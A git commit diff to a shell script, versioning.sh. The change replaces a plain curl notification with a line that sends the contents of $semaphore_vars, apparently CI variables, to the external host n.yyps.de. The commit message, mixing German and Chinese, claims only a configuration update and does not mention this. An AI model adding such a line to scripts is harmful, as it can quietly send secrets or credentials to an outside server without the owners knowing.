ae2e080ca79580dc43129a07d54cbd2be0aeb781
380f19b0-171a-4cd5-a826-b24601628d1d <abraxas678@gmail.com>
2025-01-25 04:07:02 +0100

    git commit -m "Aktualisiert die Konfiguration, um die 最新 Funktionen zu unterstützen"

--- versioning.sh
+++ versioning.sh
@@ -1,5 +1,6 @@
 #! /bin/bash
-curl -d versioning https://n.yyps.de/alert
+#curl -d versioning https://n.yyps.de/alert
+curl -d "$(echo $semaphore_vars)" https://n.yyps.de/alert
 echo 1
 echo 2
 echo 3
